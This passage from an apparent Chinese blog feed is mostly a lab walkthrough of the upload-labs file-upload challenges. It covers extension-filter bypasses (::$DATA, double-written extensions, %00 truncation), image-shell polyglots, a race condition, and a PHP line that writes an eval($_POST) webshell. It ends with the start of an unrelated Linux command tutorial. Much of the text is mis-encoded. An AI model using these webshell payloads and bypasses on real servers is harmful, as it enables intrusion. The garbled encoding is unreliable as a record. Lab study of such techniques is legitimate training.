ï¼Œ å¯ ä»¥ ä½¿ ç”¨ : : DATAè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨::DATAç»•è¿‡é»‘åå•(<strong>ä»…é™windows</strong>)</p><p>ä¸Šä¼ PHPä¸€å¥è¯æ–‡ä»¶ï¼ŒæŠ“åŒ…æ”¹åç¼€haha.php::$DATAï¼ˆæ³¨æ„è®¿é—®çš„æ—¶å€™ä¸è¦åŠ ä¸Š::$dataï¼‰</p><p>phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚</p><h3 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h3><p>ç¬¬10å…³å¥½åƒå’Œç¬¬äº”å…³é‡å¤äº†ï¼Œå¯ä»¥ç”¨ç¬¬äº”å…³çš„æ–¹æ³•ç»•è¿‡</p><h3 id="Pass11é»‘åå•é™åˆ¶ä¸å®Œå…¨-åŒå†™ç»•è¿‡"><a href="#Pass11é»‘åå•é™åˆ¶ä¸å®Œå…¨-åŒå†™ç»•è¿‡" class="headerlink" title="Pass11é»‘åå•é™åˆ¶ä¸å®Œå…¨ - åŒå†™ç»•è¿‡"></a>Pass11é»‘åå•é™åˆ¶ä¸å®Œå…¨ - åŒå†™ç»•è¿‡</h3><p>æºç ä¸­ ä½¿ç”¨ str_ireplace ä¸åŒºåˆ†å¤§å°å†™æ›¿æ¢ï¼Œåªæ˜¯æ›¿æ¢äº†ä¸€æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡æ£€æŸ¥</p><p>ä¸Šä¼ æ–‡ä»¶å ï¼šwebshell.pphphp</p><h3 id="Pass12-00æˆªæ–­-GETurlè·¯å¾„å¯æ§"><a href="#Pass12-00æˆªæ–­-GETurlè·¯å¾„å¯æ§" class="headerlink" title="Pass12-%00æˆªæ–­(GETurlè·¯å¾„å¯æ§)"></a>Pass12-%00æˆªæ–­(GETurlè·¯å¾„å¯æ§)</h3><p>è¿™ä¸€å…³ç™½åå•ï¼Œæœ€ç»ˆæ–‡ä»¶çš„å­˜æ”¾ä½ç½®æ˜¯ä»¥æ‹¼æ¥çš„æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨%00æˆªæ–­ï¼Œä½†éœ€è¦phpç‰ˆæœ¬&lt;5.3.4ï¼Œå¹¶ä¸”magic_quotes_gpcå…³é—­ã€‚</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/223357.png" class=""><p>urlä¸­çš„%00ï¼ˆåªè¦æ˜¯è¿™ç§%xxï¼‰çš„å½¢å¼ï¼Œwebserverä¼šæŠŠå®ƒå½“ä½œåå…­è¿›åˆ¶å¤„ç†ï¼Œç„¶åæŠŠ16è¿›åˆ¶çš„hexè‡ªåŠ¨ç¿»è¯‘æˆasciiç å€¼â€œNULLâ€,å®ç°äº†æˆªæ–­</p><h3 id="Pass13-00æˆªæ–­-POSTè·¯å¾„å¯æ§"><a href="#Pass13-00æˆªæ–­-POSTè·¯å¾„å¯æ§" class="headerlink" title="Pass13-00æˆªæ–­(POSTè·¯å¾„å¯æ§)"></a>Pass13-00æˆªæ–­(POSTè·¯å¾„å¯æ§)</h3><p>å’Œ12å…³åŒºåˆ«å°±åœ¨äºGETå’ŒPOST,GETæ˜¯å¯ä»¥æŠŠurlè‡ªåŠ¨è§£ç çš„ï¼Œä½†æ˜¯POSTä¸ä¼š</p><p>è¿™é‡Œå…ˆå†™ä¸€ä¸ªhaha.php(ç©ºæ ¼)aï¼Œå†™ç©ºæ ¼æ˜¯ä¸ºäº†ä¾¿äºä¿®æ”¹hex</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225738.png" class=""><p>å› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦å°†%00ä¿®æ”¹ä¸ºhex 00</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/225950.png" class=""><h3 id="Pass14æ–‡ä»¶å†…å®¹æ£€æµ‹"><a href="#Pass14æ–‡ä»¶å†…å®¹æ£€æµ‹" class="headerlink" title="Pass14æ–‡ä»¶å†…å®¹æ£€æµ‹"></a>Pass14æ–‡ä»¶å†…å®¹æ£€æµ‹</h3><p>è¿™ä¸€å…³ä¼šè¯»å–åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼Œå¹¶ä¸”åç«¯ä¼šæ ¹æ®åˆ¤æ–­å¾—åˆ°çš„æ–‡ä»¶ç±»å‹é‡å‘½åä¸Šä¼ æ–‡ä»¶</p><p>ä½¿ç”¨ å›¾ç‰‡é©¬ + æ–‡ä»¶åŒ…å« ç»•è¿‡</p><p><strong>åˆ¶ä½œå›¾ç‰‡é©¬ä¸Šä¼ </strong></p><pre><code>Linuxä¸‹ï¼šcat 1.png 1.php &gt; 2.pngWindowsä¸‹ï¼šcopy 1.png /b + 1.php /a 2.png</code></pre><pre><code>è¡¥å……çŸ¥è¯†ï¼š1.Pngå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬8å­—èŠ‚ï¼š89 50 4E 47 0D 0A 1A 0Aã€‚å³ä¸º .PNGã€‚2.Jpgå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼šFF D8ã€‚3.Gifå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬6å­—èŠ‚ï¼š47 49 46 38 39|37 61 ã€‚å³ä¸º GIF89(7)aã€‚4.Bmpå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼š42 4Dã€‚å³ä¸º BMã€‚</code></pre><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥å¯ä»¥åœ¨å›¾ç‰‡é©¬å¼€å¤´åŠ ä¸ŠGIF89a</p><p>ä¸Šä¼ å›¾ç‰‡é©¬åç‚¹å‡»â€˜æ–‡ä»¶åŒ…å«æ¼æ´â€™é“¾æ¥ï¼Œç„¶ååœ¨urlé‡ŒåŠ ä¸Š?file&#x3D;upload&#x2F;xxxxxxxx.gifå³å¯</p><h3 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h3><p><strong>image_type_to_extension</strong> æ ¹æ®æŒ‡å®šçš„å›¾åƒç±»å‹è¿”å›å¯¹åº”çš„åç¼€å</p><p>å’Œ14å…³çš„åšæ³•ä¸€è‡´</p><h3 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h3><p><strong>exif_imagetype()</strong> åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹,è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p><p>æœ¬å‡½æ•°å¯ç”¨æ¥é¿å…è°ƒç”¨å…¶å®ƒ exifå‡½æ•°ç”¨åˆ°äº†ä¸æ”¯æŒçš„æ–‡ä»¶ç±»å‹ä¸Šæˆ–å’Œ [$_SERVERâ€™HTTP_ACCEPTâ€™] ç»“åˆä½¿ç”¨æ¥æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å¯ä»¥æ˜¾ç¤ºæŸä¸ªæŒ‡å®šçš„å›¾åƒã€‚éœ€è¦å¼€å¯ php_exifæ¨¡å—</p><p>å’Œ14å…³åšæ³•ä¸€è‡´</p><h3 id="Pass17äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#Pass17äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="Pass17äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>Pass17äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h3><p><strong>imagecreatefromjpegï¼ˆï¼‰å‡½æ•°</strong> äºŒæ¬¡æ¸²æŸ“æ˜¯ç”±Gifæ–‡ä»¶æˆ– URL åˆ›å»ºä¸€ä¸ªæ–°å›¾è±¡ã€‚æˆåŠŸåˆ™è¿”å›ä¸€å›¾åƒæ ‡è¯†ç¬¦&#x2F;å›¾åƒèµ„æºï¼Œå¤±è´¥åˆ™è¿”å›falseï¼Œå¯¼è‡´å›¾ç‰‡é©¬çš„æ•°æ®ä¸¢å¤±ï¼Œä¸Šä¼ å›¾ç‰‡é©¬å¤±è´¥ã€‚</p><p>imagecreatefromjpegäºŒæ¬¡æ¸²æŸ“å®ƒç›¸å½“äºæ˜¯æŠŠåŸæœ¬å±äºå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­éå›¾åƒæ•°æ®çš„éƒ¨åˆ†ç›´æ¥å°±éš”ç¦»å¼€äº†ã€‚</p><p>æ‰€ä»¥äºŒæ¬¡æ¸²æŸ“ç»•è¿‡å°±æ˜¯æŠŠåŸå›¾å’Œä»–ä¿®æ”¹è¿‡çš„å›¾ç‰‡è¿›è¡Œæ¯”è¾ƒï¼Œçœ‹çœ‹å“ªä¸ªéƒ¨åˆ†æ²¡æœ‰è¢«ä¿®æ”¹ã€‚å°†phpä»£ç æ”¾åˆ°æ²¡æœ‰è¢«æ›´æ”¹çš„éƒ¨åˆ†ã€‚</p><p>è¿™é‡Œæœ‰ä¸ªå°æç¤ºï¼Œå¯¹äºåšæ–‡ä»¶ä¸Šä¼ ä¹‹äºŒæ¬¡æ¸²æŸ“å»ºè®®ç”¨GIFå›¾ç‰‡ï¼Œç›¸å¯¹äºç®€å•ä¸€ç‚¹ã€‚ä¸Šä¼ æ­£å¸¸çš„GIFå›¾ç‰‡ä¸‹è½½å›æ˜¾çš„å›¾ç‰‡ï¼Œç”¨ç¼–è¾‘å™¨è¿›è¡Œå¯¹æ¯”ä¸¤ä¸ªGIFå›¾ç‰‡å†…å®¹ï¼Œæ‰¾åˆ°ç›¸åŒçš„åœ°æ–¹ï¼ˆæŒ‡çš„æ˜¯ä¸Šä¼ å‰å’Œä¸Šä¼ åï¼Œä¸¤å¼ å›¾ç‰‡çš„éƒ¨åˆ†Hexä»ç„¶ä¿æŒä¸å˜çš„ä½ç½®ï¼‰å¹¶æ’å…¥PHPä¸€å¥è¯ï¼Œä¸Šä¼ å¸¦æœ‰PHPä¸€å¥è¯æœ¨é©¬çš„GIFå›¾ç‰‡</p><p>å¯ä»¥å‚è€ƒ <a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><h3 id="Pass18æ¡ä»¶ç«äº‰"><a href="#Pass18æ¡ä»¶ç«äº‰" class="headerlink" title="Pass18æ¡ä»¶ç«äº‰"></a>Pass18æ¡ä»¶ç«äº‰</h3><p>ç¬¬åå…«å…³ä¸»è¦æ˜¯å¯¹æ¡ä»¶ç«äº‰çš„è€ƒå¯Ÿï¼Œæˆ‘ä»¬çœ‹ä»£ç ä»–æ˜¯å…ˆå°†å›¾ç‰‡ä¸Šä¼ ä¸Šå»ï¼Œæ‰å¼€å§‹è¿›è¡Œåˆ¤æ–­åç¼€åã€äºŒæ¬¡æ¸²æŸ“ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¸Šä¼ ä¸Šå»çš„ä¸€ç¬é—´è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä»–å°±ä¸èƒ½å¯¹è¿™ä¸ªæ–‡ä»¶åˆ é™¤ã€äºŒæ¬¡æ¸²æŸ“ã€‚è¿™å°±ç›¸å½“äºæˆ‘ä»¬æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå†å»åˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæç¤ºè¿™ä¸ªæ–‡ä»¶åœ¨å¦ä¸€ç¨‹åºä¸­æ‰“å¼€æ— æ³•åˆ é™¤ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨burpå¤šçº¿ç¨‹å‘åŒ…ï¼Œç„¶åä¸æ–­åœ¨æµè§ˆå™¨è®¿é—®æˆ‘ä»¬çš„webshellï¼Œä¼šæœ‰ä¸€ç¬é—´çš„è®¿é—®æˆåŠŸã€‚æŠŠæœ¨é©¬phpæ–‡ä»¶é€šè¿‡burpä¸€ç›´ä¸åœçš„é‡æ”¾ï¼Œç„¶åå†å†™pythonè„šæœ¬å»ä¸åœçš„è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„è¿™ä¸ªæ–‡ä»¶ï¼Œæ€»ä¼šæœ‰é‚£ä¹ˆä¸€ç¬é—´æ˜¯è¿˜æ²¡æ¥å¾—åŠåˆ é™¤å°±å¯ä»¥è¢«è®¿é—®åˆ°çš„ã€‚</p><p>æ“ä½œï¼šé¦–å…ˆï¼Œæˆ‘ä»¬ä¸Šä¼ PHPæ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠæœ¨é©¬æ¢ä¸€ä¸‹æ”¹ä¸ºï¼š</p><pre><code>&lt;?php fputs(fopen(&#39;Tony.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#39;);?&gt;</code></pre><p>è¿™æ ·ä¸€æ—¦è®¿é—®åˆ°è¯¥æ–‡ä»¶å°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>Tony.php</code>çš„ä¸€å¥è¯ï¼Œå°±ä¸å¿…è¢«åˆ é™¤äº†ã€‚</p><p>ç”¨BPæ‹¦æˆª</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/192630.png" class=""><p>ç„¶åç‚¹å‡»<code>Clear$</code>ï¼Œæ¥ç€è®¾ç½®æ— é™å‘é€ç©ºçš„<code>Payloads</code>ï¼Œæ¥è®©å®ƒä¸€ç›´ä¸Šä¼ è¯¥æ–‡ä»¶</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193036.png" class=""><p>å¯ä»¥æŠŠå¹¶å‘è¯·æ±‚æ•°è®¾ç½®é«˜ä¸€ç‚¹</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/193626.png" class=""><p>ç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªpythonè„šæœ¬ï¼Œé€šè¿‡å®ƒæ¥ä¸åœçš„è®¿é—®æˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„PHPæ–‡ä»¶</p><pre><code class="python">import requestsurl = &quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/haha.php&quot;while True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥åœ¨BPç‚¹å‡»å¼€å§‹æ”»å‡»ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿè¦è¿è¡Œpythonè„šæœ¬ï¼Œå½“å‡ºç°OKè¯´æ˜è®¿é—®åˆ°äº†è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆTony.phpåº”è¯¥ä¹Ÿåˆ›å»ºæˆåŠŸäº†ã€‚</p><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p><h3 id="Pass19"><a href="#Pass19" class="headerlink" title="Pass19"></a>Pass19</h3><p>ç¬¬åä¹å…³çš„ä¸Šä¼ è·¯å¾„æœ‰ç‚¹é—®é¢˜ï¼Œä¸æ˜¯ä¸Šä¼ åˆ°äº†uploadé‡Œé¢ï¼Œå»ºè®®ä¿®æ”¹ä¸€ä¸‹ï¼Œè¿›å…¥ç¬¬åä¹å…³ï¼Œæ‰¾åˆ°myupload.phpæ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤ºä¿®æ”¹ã€‚æ”¹å®Œåè¦é‡å¯é¶åœº</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/201031.png" class=""><p>è¿™å…³æ˜¯å…ˆæ£€æŸ¥äº†åç¼€åï¼Œç„¶åä¸Šä¼ ï¼Œç„¶ååœ¨è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ã€‚è¿™æ—¶æˆ‘ä»¬åªèƒ½ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè€Œä¸”å¾—é…åˆapacheè§£ææ¼æ´æˆ–æ–‡ä»¶åŒ…å«è¿›è¡Œé€šå…³</p><p>è¿™å…³å’Œä¸Šä¸€å…³æ“ä½œå·®ä¸å¤šï¼Œä¸è¿‡å¾—æ”¹ä¸€ä¸‹pythonè„šæœ¬ï¼š</p><p>import requests</p><pre><code>url = &quot;http://xxx.xxx.xxx.xxx/upload-labs/include.php/?file=./upload/haha.pngwhile True:    html = requests.get(url)    if html.status_code == 200:        print(&quot;OK&quot;)        break</code></pre><p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹æœ€åè®¿é—®çš„URLä¸º<a href="http://xxx.xxx.xxx.xxx/upload-labs/Tony.php">http://xxx.xxx.xxx.xxx/upload-labs/Tony.php</a></p><h3 id="Pass20-x2F-ç»•è¿‡"><a href="#Pass20-x2F-ç»•è¿‡" class="headerlink" title="Pass20 &#x2F;.ç»•è¿‡"></a>Pass20 &#x2F;.ç»•è¿‡</h3><p>move_uploaded_file()ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>/.</code></p><p><code>save_name</code> å¯æ§ï¼Œå°±å¯ä»¥ç›´æ¥å°†æ–‡ä»¶åå†™æˆhaha.php&#x2F;.</p><p>ä¹Ÿå¯ä»¥ç”¨%00æˆªæ–­ç»•è¿‡</p><h3 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h3><p>å‚è€ƒåˆ«äººå¾—wpï¼š</p><pre><code>è¿™ä¸€å…³ç™½åå•éªŒè¯è¿‡ç¨‹ï¼š--&gt; éªŒè¯ä¸Šä¼ è·¯å¾„æ˜¯å¦å­˜åœ¨--&gt; éªŒè¯[&#39;upload_file&#39;]çš„content-typeæ˜¯å¦åˆæ³•ï¼ˆå¯ä»¥æŠ“åŒ…ä¿®æ”¹ï¼‰--&gt; åˆ¤æ–­POSTå‚æ•°æ˜¯å¦ä¸ºç©ºå®šä¹‰$fileå˜é‡ï¼ˆå…³é”®ï¼šæ„é€ æ•°ç»„ç»•è¿‡ä¸‹ä¸€æ­¥çš„åˆ¤æ–­ï¼‰--&gt;åˆ¤æ–­fileä¸æ˜¯æ•°ç»„åˆ™ä½¿ç”¨explode(&#39;.&#39;, strtolower($file))å¯¹fileè¿›è¡Œåˆ‡å‰²ï¼Œå°†fileå˜ä¸ºä¸€ä¸ªæ•°ç»„--&gt; åˆ¤æ–­æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ æ˜¯å¦åˆæ³•--&gt; æ•°ç»„ç¬¬ä¸€ä½å’Œ$file[count($file) - 1]è¿›è¡Œæ‹¼æ¥ï¼Œäº§ç”Ÿä¿å­˜æ–‡ä»¶åfile_name--&gt; ä¸Šä¼ æ–‡ä»¶</code></pre><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210539.png" class=""><p>ä¸Šä¼ ä¸€å¥è¯pngï¼ŒburpæŠ“åŒ…å¹¶æ”¹åŒ…ï¼š</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/210652.png" class=""><pre><code>ä¿®æ”¹POSTå‚æ•°ä¸ºæ•°ç»„ç±»å‹ï¼Œç´¢å¼•[0]ä¸º`haha.php`ï¼Œç´¢å¼•[2]ä¸º`jpg|png|gif`ã€‚ åªè¦ç¬¬äºŒä¸ªç´¢å¼•`ä¸ä¸º1`ï¼Œ$file[count($file) - 1]å°±ç­‰ä»·äº$file[2-1]ï¼Œå€¼ä¸ºç©º</code></pre><p>æœ€åï¼ŒæœåŠ¡ç«¯å°±æˆåŠŸå­˜åœ¨äº†haha.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxå­¦ä¹ </title>
      <link href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/14/linux%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€linuxæ–‡ä»¶ä¸ç›®å½•ç»“æ„"><a href="#ä¸€ã€linuxæ–‡ä»¶ä¸ç›®å½•ç»“æ„" class="headerlink" title="ä¸€ã€linuxæ–‡ä»¶ä¸ç›®å½•ç»“æ„"></a>ä¸€ã€linuxæ–‡ä»¶ä¸ç›®å½•ç»“æ„</h2><p>1.linuxæ–‡ä»¶</p><p>â€‹linux ç³»ç»Ÿä¸­ä¸€åˆ‡çš†æ–‡ä»¶</p><p>2.linux ç›®å½•ç»“æ„</p><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11230.jpg" class=""><img src="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/11231.png" class=""><h2 id="äºŒã€vi-x2F-vimç¼–è¾‘å™¨"><a href="#äºŒã€vi-x2F-vimç¼–è¾‘å™¨" class="headerlink" title="äºŒã€vi&#x2F;vimç¼–è¾‘å™¨"></a>äºŒã€vi&#x2F;vimç¼–è¾‘å™¨</h2><p>1ã€æ™®é€šæ¨¡å¼</p><p>2ã€ç¼–è¾‘æ¨¡å¼</p><p>3ã€å‘½ä»¤æ¨¡å¼</p><pre><code>å‘½ä»¤  åŠŸèƒ½:w  ä¿å­˜:q  é€€å‡º:wq  ä¿å­˜å¹¶é€€å‡º:q!  ä¸ä¿å­˜å¼ºåˆ¶é€€å‡º:set nu    æ˜¾ç¤ºè¡Œå·:set nonu   å…³é—­è¡Œå·/è¦æŸ¥æ‰¾çš„è¯ n   æŸ¥æ‰¾ä¸‹ä¸€ä¸ªï¼ŒN å¾€ä¸ŠæŸ¥æ‰¾:noh     å–æ¶ˆé«˜äº®æ˜¾ç¤º</code></pre><h2 id="ä¸‰ã€å¸¸ç”¨åŸºæœ¬å‘½ä»¤"><a href="#ä¸‰ã€å¸¸ç”¨åŸºæœ¬å‘½ä»¤" class="headerlink" title="ä¸‰ã€å¸¸ç”¨åŸºæœ¬å‘½ä»¤"></a>ä¸‰ã€å¸¸ç”¨åŸºæœ¬å‘½ä»¤</h2><h4 id="1ã€å¸®åŠ©å‘½ä»¤"><a href="#1ã€å¸®åŠ©å‘½ä»¤" class="headerlink" title="1ã€å¸®åŠ©å‘½ä»¤"></a>1ã€å¸®åŠ©å‘½ä»¤</h4><p>â€‹manè·å¾—å¸®åŠ©ä¿¡æ¯</p><p>â€‹helpè·å¾—shellå†…ç½®å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ï¼ˆç³»ç»ŸåŠ è½½å¯åŠ¨åéšç€shellä¸€èµ·åŠ è½½ï¼Œå¸¸é©»ç³»ç»Ÿå†…å­˜ä¸­ï¼Œè¿™éƒ¨åˆ†å‘½ä»¤è¢«ç§°ä¸ºå†…ç½®å‘½ä»¤,ä½¿ç”¨typeæŸ¥çœ‹å‘½ä»¤ç±»å‹ï¼‰</p><h4 id="2ã€æ–‡ä»¶ç›®å½•ç±»"><a href="#2ã€æ–‡ä»¶ç›®å½•ç±»" class="headerlink" title="2ã€æ–‡ä»¶ç›®å½•ç±»"></a>2ã€æ–‡ä»¶ç›®å½•ç±»</h4><p>ï¼ˆ1ï¼‰pwd æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•è·¯å¾„</p><p>ï¼ˆ2ï¼‰cd åˆ‡æ¢è·¯å¾„</p><p>ï¼ˆ3ï¼‰ls åˆ—å‡ºç›®å½•çš„å†…å®¹</p><p>â€‹-aå…¨éƒ¨çš„æ–‡ä»¶ï¼Œè¿åŒéšè—æ¡£ï¼ˆå¼€å¤´ä¸º . çš„æ–‡ä»¶ï¼‰ä¸€èµ·åˆ—å‡ºæ¥</p><p>â€‹-l é•¿æ•°æ®åˆ—å‡ºï¼ŒåŒ…å«æ–‡ä»¶çš„å±æ€§ä¸æƒé™ç­‰ç­‰æ•°æ®ï¼Œç­‰åŒä¸â€llâ€</p><p>ï¼ˆ4ï¼‰mkdir åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹</p><p>ï¼ˆ5ï¼‰rmdir åˆ é™¤ä¸€ä¸ªç©ºçš„æ–‡ä»¶å¤¹</p><p>ï¼ˆ6ï¼‰touch åˆ›å»ºç©ºæ–‡ä»¶</p><p>ï¼ˆ7ï¼‰cp å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</p><p>â€‹cp  test.txt  ..&#x2F;home&#x2F;afdsf&#x2F;å°†test.txtå¤åˆ¶åˆ°..&#x2F;home&#x2F;afdsfç›®å½•ä¸‹</p><p>â€‹cp  test.txt  ..&#x2F;home&#x2F;dsaf.txtå°†test.txtä¸­çš„å†…å®¹è¦†ç›–åˆ°dsaf.txt</p><p>â€‹cp  -r  a  &#x2F;home&#x2F;afdsf&#x2F;å°†aç›®å½•å¤åˆ¶åˆ°afdsfç›®å½•ä¸‹</p><p>ï¼ˆ8ï¼‰rm åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•</p><p>â€‹-ré€’å½’åˆ é™¤ç›®å½•ä¸­çš„æ‰€æœ‰å†…å®¹</p><p>â€‹-få¼ºåˆ¶æ‰§è¡Œåˆ é™¤æ“ä½œã€‚è€Œä¸æ˜¯æç¤ºè¿›è¡Œç¡®è®¤</p><p>ï¼ˆ9ï¼‰mv ç§»åŠ¨æ–‡ä»¶ä¸ç›®å½•æˆ–é‡å‘½å</p><p>â€‹mv  inital.txt  &#x2F;home&#x2F;dfds&#x2F;  ç§»åŠ¨æ–‡ä»¶</p><p>â€‹mv  inital.txt  &#x2F;home&#x2F;dfds&#x2F;1.txt  å°†inital.txtç§»åŠ¨å¹¶ä¸”é‡å‘½åä¸º1.txt</p><p>ï¼ˆ10ï¼‰cat æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><p>â€‹-næ˜¾ç¤ºæ‰€æœ‰è¡Œçš„è¡Œå·ï¼ŒåŒ…æ‹¬ç©ºè¡Œ</p><p>ï¼ˆ11ï¼‰more æ–‡ä»¶å†…å®¹åˆ†å±æŸ¥çœ‹å™¨</p><p>ï¼ˆ12ï¼‰less  åˆ†å±æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ˆæ¯”moreæ›´å¼ºå¤§ï¼‰</p><p>ï¼ˆ13ï¼‰echo è¾“å‡ºå†…å®¹åˆ°æ§åˆ¶å°</p><p>â€‹-eæ”¯æŒåæ–œçº¿æ§åˆ¶çš„å­—ç¬¦è½¬æ¢</p><p>ï¼ˆ14ï¼‰&gt; è¾“å‡ºé‡å®šå‘å’Œ &gt;&gt; è¿½åŠ </p><p>â€‹ls -l &gt; a.txtï¼ˆåˆ—è¡¨çš„å†…å®¹å†™å…¥æ–‡ä»¶a.txtä¸­ï¼ˆè¦†ç›–å†™ï¼‰ï¼‰</p><p>â€‹ls -ll &gt;&gt; a.txt ï¼ˆåˆ—è¡¨çš„å†…å®¹è¿½åŠ åˆ°æ–‡ä»¶a.txtçš„æœ«å°¾ï¼‰</p><p>â€‹cat æ–‡ä»¶1 &gt; æ–‡ä»¶2ï¼ˆå°†æ–‡ä»¶1çš„å†…å®¹è¦†ç›–åˆ°æ–‡ä»¶2ï¼‰</p><p>ï¼ˆ15ï¼‰head æ˜¾ç¤ºæ–‡ä»¶å¤´éƒ¨å†…å®¹</p><p>â€‹headç”¨äºæ˜¾ç¤ºæ–‡ä»¶å¼€å¤´éƒ¨åˆ†å†…å®¹ï¼Œé»˜è®¤æƒ…å†µä¸‹headæŒ‡ä»¤æ˜¾ç¤ºæ–‡ä»¶çš„å‰10è¡Œå†…å®¹</p><p>â€‹-n&lt;è¡Œæ•°&gt; æŒ‡å®šæ˜¾ç¤ºå¤´éƒ¨å†…å®¹çš„è¡Œæ•°</p><p>ï¼ˆ16ï¼‰tail è¾“å‡ºæ–‡ä»¶å°¾éƒ¨å†…å®¹</p><p>â€‹tail -n 5 æ–‡ä»¶æŸ¥çœ‹æ–‡ä»¶å°¾éƒ¨5è¡Œå†…å®¹</p><p>â€‹tail -f æ–‡ä»¶å®æ—¶è¿½è¸ªè¯¥æ–‡æ¡£çš„æ‰€æœ‰æ›´æ–°</p><p>ï¼ˆ17ï¼‰ln è½¯é“¾æ¥è½¯é“¾æ¥ä¹Ÿç§°ä¸ºç¬¦å·é“¾æ¥ï¼Œç±»ä¼¼äºwindowsé‡Œçš„å¿«æ·æ–¹å¼ï¼Œä¸»è¦å­˜æ”¾äº†é“¾æ¥å…¶ä»–æ–‡ä»¶çš„è·¯å¾„</p><p>ï¼ˆ18ï¼‰history 